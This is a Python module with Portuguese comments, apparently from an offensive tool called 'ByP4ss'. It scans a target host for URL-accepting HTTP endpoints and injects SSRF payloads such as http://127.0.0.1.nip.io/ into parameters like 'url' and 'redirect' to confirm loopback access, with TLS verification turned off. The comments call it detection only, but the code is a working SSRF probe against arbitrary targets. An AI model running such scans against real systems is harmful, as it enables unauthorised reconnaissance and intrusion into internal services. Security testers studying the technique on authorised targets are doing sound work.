# DnsRebind do ByP4ss
# Detecta SSRF via DNS rebinding: o alvo tem endpoint HTTP que aceita URL
# e acessa 127.0.0.1 quando o hostname e um dominio que resolve pra loopback?
# Chamado por Core.Engine.Bypass: Mod.DnsRebind.Tentar(Alvo)
#
# nip.io e sslip.io sao FERRAMENTAS (dominios que resolvem pra IP do
# subdominio). Resolverem sozinhos NAO e vulnerabilidade de ninguem.
# So e SSRF se o ALVO acessar 127.0.0.1 atraves do endpoint.
#
# Seguranca: so HTTP GET via urllib. Nenhum comando executa.

import socket
import ssl
import time
import urllib.request
import urllib.error
import re

from Core.Config import Config
from Core.Log import Log


class DnsRebind:

    ENDPOINTS_SSRF = [
        "/", "/api", "/api/proxy", "/proxy", "/fetch",
        "/redirect", "/url", "/link", "/src", "/dest",
    ]

    PARAMS_URL = ["url", "redirect", "redirect_uri", "link", "src",
                  "dest", "target", "next", "callback", "proxy"]

    DOMINIOS_REBIND = ["nip.io", "sslip.io"]

    TIMEOUT_HTTP = 5.0

    @staticmethod
    def Tentar(Alvo):
        Resultado = {
            "ok": False,
            "alvo": Alvo,
            "motivo": "",
            "endpoints_ssrf": [],
            "ssrf_confirmado": False,
            "rebind_ativo": False,
            "detalhes": [],
        }
        if not Alvo:
            Resultado["motivo"] = "alvo_ausente"
            return Resultado
        Log.Info("dnsrebind iniciado", {"alvo": Alvo})
        Endpoints = DnsRebind._ProcurarEndpoints(Alvo)
        Resultado["endpoints_ssrf"] = [E["url"] for E in Endpoints]
        if not Endpoints:
            Resultado["motivo"] = "sem_endpoint_ssrf"
            Log.Bypass("DnsRebind", Alvo, False, {"motivo": "sem_endpoint_ssrf"})
            return Resultado
        for Endpoint in Endpoints:
            R = DnsRebind._TestarSSRF(Alvo, Endpoint)
            Resultado["detalhes"].append(R)
            if R.get("vulneravel"):
                Resultado["ok"] = True
                Resultado["ssrf_confirmado"] = True
                Resultado["rebind_ativo"] = R.get("rebind", False)
                Resultado["motivo"] = "ssrf_confirmado"
                Log.Bypass("DnsRebind", Alvo, True, {
                    "endpoint": Endpoint["url"],
                    "rebind": R.get("rebind", False),
                })
                return Resultado
        Resultado["motivo"] = "sem_ssrf"
        Log.Bypass("DnsRebind", Alvo, False, {"motivo": "sem_ssrf"})
        return Resultado

    @staticmethod
    def _ProcurarEndpoints(Alvo):
        Achados = []
        Portas = [80, 8080, 8000]
        for Porta in Portas:
            Base = f"http://{Alvo}:{Porta}"
            for Path in DnsRebind.ENDPOINTS_SSRF:
                Url = Base + Path
                R = DnsRebind._Fetch(Url)
                if not R.get("ok"):
                    continue
                Corpo = R.get("corpo", "") or ""
                Param = DnsRebind._DetectarParametro(Corpo)
                Achados.append({
                    "url": Url,
                    "porta": Porta,
                    "path": Path,
                    "param": Param or "url",
                    "status": R.get("status", 0),
                })
                if len(Achados) >= 3:
                    return Achados
        return Achados

    @staticmethod
    def _DetectarParametro(Corpo):
        if not Corpo:
            return None
        for Param in DnsRebind.PARAMS_URL:
            Padroes = [
                r'name=["\']?' + re.escape(Param) + r'["\']?',
                r'\?' + re.escape(Param) + r'=',
                r'["\']?' + re.escape(Param) + r'["\']?\s*[:=]',
            ]
            for P in Padroes:
                if re.search(P, Corpo, re.IGNORECASE):
                    return Param
        return None

    @staticmethod
    def _TestarSSRF(Alvo, Endpoint):
        Resultado = {
            "endpoint": Endpoint["url"],
            "param": Endpoint["param"],
            "vulneravel": False,
            "rebind": False,
            "baseline_status": None,
            "teste_status": None,
            "baseline_len": 0,
            "teste_len": 0,
        }
        UrlBase = Endpoint["url"]
        Param = Endpoint["param"]
        Sep = "&" if "?" in UrlBase else "?"
        BaselineUrl = f"{UrlBase}{Sep}{Param}=http://{Alvo}/"
        R1 = DnsRebind._Fetch(BaselineUrl)
        Resultado["baseline_status"] = R1.get("status", 0)
        Resultado["baseline_len"] = len(R1.get("corpo", "") or "")
        if not R1.get("ok"):
            return Resultado
        time.sleep(0.3)
        for Dominio in DnsRebind.DOMINIOS_REBIND:
            RebindHost = f"127.0.0.1.{Dominio}"
            TesteUrl = f"{UrlBase}{Sep}{Param}=http://{RebindHost}/"
            R2 = DnsRebind._Fetch(TesteUrl)
            Resultado["teste_status"] = R2.get("status", 0)
            Resultado["teste_len"] = len(R2.get("corpo", "") or "")
            if not R2.get("ok"):
                continue
            CorpoTeste = (R2.get("corpo", "") or "").lower()
            Indicios = [
                "localhost", "127.0.0.1", "loopback", "internal",
                "index of /", "welcome to nginx", "apache2 ubuntu default",
            ]
            TemIndicio = any(I in CorpoTeste for I in Indicios)
            Diferenca = abs(Resultado["teste_len"] - Resultado["baseline_len"])
            if TemIndicio or Diferenca > 500:
                Resultado["vulneravel"] = True
                Resultado["rebind"] = True
                Resultado["dominio"] = RebindHost
                return Resultado
        return Resultado

    @staticmethod
    def _Fetch(Url):
        Ctx = ssl.create_default_context()
        Ctx.check_hostname = False
        Ctx.verify_mode = ssl.CERT_NONE
        try:
            Req = urllib.request.Request(Url, headers={
                "User-Agent": "ByP4ss/1.0", "Accept": "*/*", "Connection": "close",
            })
            with urllib.request.urlopen(Req, timeout=DnsRebind.TIMEOUT_HTTP,
                                        context=Ctx) as F:
                Corpo = F.read(8192).decode("utf-8", errors="replace")
                return {"ok": True, "status": getattr(F, "status", 200), "corpo": Corpo}
        except urllib.error.HTTPError as E:
            try:
                Corpo = E.read(4096).decode("utf-8", errors="replace")
            except Exception:
                Corpo = ""
            return {"ok": E.code in (400, 401, 403, 500),
                    "status": E.code, "corpo": Corpo}
        except Exception as E:
            return {"ok": False, "status": 0, "corpo": "", "erro": str(E)}

    @staticmethod
    def Info():
        return {
            "nome": "DnsRebind",
            "metodo": "ssrf_via_dns_rebind",
            "dominios_ferramenta": list(DnsRebind.DOMINIOS_REBIND),
            "endpoints_testados": len(DnsRebind.ENDPOINTS_SSRF),
        }


if __name__ == "__main__":
    import sys, json
    if len(sys.argv) > 1 and sys.argv[1] == "teste":
        Alvo = sys.argv[2] if len(sys.argv) > 2 else "192.168.0.1"
        print(f"dnsrebind {Alvo}")
        R = DnsRebind.Tentar(Alvo)
        print(json.dumps(R, indent=2, ensure_ascii=False, default=str))
